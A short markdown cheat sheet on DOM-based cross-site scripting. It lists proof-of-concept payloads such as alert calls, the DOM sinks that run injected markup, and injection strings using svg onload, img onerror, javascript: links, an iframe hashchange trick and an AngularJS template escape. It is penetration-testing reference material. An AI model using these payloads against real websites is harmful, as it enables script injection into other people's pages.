# DOM Based

## Payloads

### Scripts

Test execution

```
alert(1)
alert(window.location.href)
alert(document.domain)
console.log("pwned")
print()
```

## Injection vectors

### document

```
document.write()
document.writeln()
document.domain
```

Allows execution of \<script> blocks

```
"><svg onload="...">
"><script>...</script>
```

### element

```
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

Prevents execution of \<script> and SVG blocks use onload/onerror JS calls to run code

```
"><img src="." onerror="...">
```

### Dynamic href

Anchors whose links are controlled by params read by JS scripts can be hijacked

```
<param>=javascript:...
```

### $(...) with hashchange event

```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=...>'">
```

### AngularJS ng-app

```
{{$on.constructor('<...>')()}}
```
